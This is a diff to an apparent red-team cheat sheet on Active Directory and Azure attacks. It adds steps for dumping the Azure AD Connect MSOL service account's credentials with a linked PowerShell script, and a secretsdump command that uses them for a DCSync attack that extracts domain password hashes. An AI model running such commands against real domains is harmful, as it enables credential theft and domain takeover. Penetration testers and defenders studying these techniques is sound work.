@@ -70,7 +70,7 @@ it is the first version of this repo, many things will be added later, so stay t
     - [PowerZure](#powerzure)
     - [Golden SAML](#golden-saml)
     - [PassTheCRT](#passthecrt)
-    - [MSOL Account](#msol-account)
+    - [MSOL Service Account](#msol-account)
   - [Miscs](#miscs)
     - [Domain Level Attribute](#domain-level-attribute)
       - [MachineAccountQuota (MAQ) Exploitation](#machineaccountquota-maq-exploitation)
@@ -757,8 +757,12 @@ a toolkit to exploit Golden SAML can be found [here](https://github.com/securewo
 
 ### MSOL Account
 
-[username]:[password]@[ip]
+you can dump MSOL Service account with [azuread_decrypt_msol.ps1](https://gist.github.com/xpn/f12b145dba16c2eebdd1c6829267b90c) used by Azure AD Connect Sync and launch a DCsync attack with the dumped creds
 
+*DCSync with MSOL account*
+```powershell
+secretsdump -outputfile hashes $domain/$msol_svc_acc:$msol_pwd@$ip
+```
 
 ## Miscs 
 
